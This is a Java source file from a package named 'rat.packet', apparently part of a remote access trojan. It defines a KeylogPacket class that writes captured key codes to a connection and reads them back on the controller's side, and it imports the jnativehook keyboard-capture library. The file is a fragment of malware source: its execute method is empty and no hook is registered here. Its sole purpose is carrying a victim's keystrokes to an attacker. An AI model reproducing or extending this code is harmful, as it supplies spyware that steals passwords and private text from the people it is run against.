package de.sogomn.rat.packet;

import org.jnativehook.keyboard.NativeKeyEvent;

import de.sogomn.rat.ActiveConnection;

public final class KeylogPacket implements IPacket {
	
	private int keyCode;
	
	public KeylogPacket(final int keyCode) {
		this.keyCode = keyCode;
	}
	
	public KeylogPacket() {
		this(NativeKeyEvent.VC_UNDEFINED);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(keyCode);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		keyCode = connection.readInt();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		//...
	}
	
	public int getKeyCode() {
		return keyCode;
	}
	
}
